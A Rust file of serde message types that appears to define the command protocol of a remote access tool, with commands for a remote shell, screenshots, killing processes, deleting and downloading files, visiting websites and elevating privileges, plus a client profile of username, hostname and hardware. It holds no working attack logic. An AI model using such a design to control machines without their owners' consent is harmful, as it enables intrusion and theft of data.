use serde::{ Serialize, Deserialize };

#[derive(Serialize, Deserialize, Debug)]
pub enum Command {
    EncryptionRequest(EncryptionRequestData),
    EncryptionResponse(EncryptionResponseData),

    InitClient,
    Client(ClientInfo),

    Reconnect,
    Disconnect,

    GetProcessList,
    ProcessList(ProcessList),
    KillProcess(Process),

    StartShell,
    ExitShell,
    ShellCommand(String),
    ShellOutput(String),

    ScreenshotDisplay(String),
    ScreenshotResult(Vec<u8>),

    ManageSystem(String),

    ViewDir(String),
    PreviousDir,
    RemoveDir(String),
    RemoveFile(String),
    DownloadFile(String),
    DonwloadFileResult(FileData),

    AvailableDisks,
    DisksResult(Vec<String>),
    FileList(Vec<File>),
    CurrentFolder(String),

    VisitWebsite(VisitWebsiteData),

    ElevateClient,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ClientInfo {
    pub username: String,
    pub hostname: String,
    pub os: String,
    pub ram: String,
    pub cpu: String,
    pub gpus: Vec<String>,
    pub storage: Vec<String>,
    pub displays: i32,
    pub is_elevated: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProcessList {
    pub processes: Vec<Process>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Process {
    pub pid: usize,
    pub name: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct File {
    pub file_type: String,
    pub name: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct FileData {
    pub name: String,
    pub data: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct EncryptionRequestData {
    pub public_key: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct EncryptionResponseData {
    pub secret: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct VisitWebsiteData {
    pub visit_type: String,
    pub url: String,
}
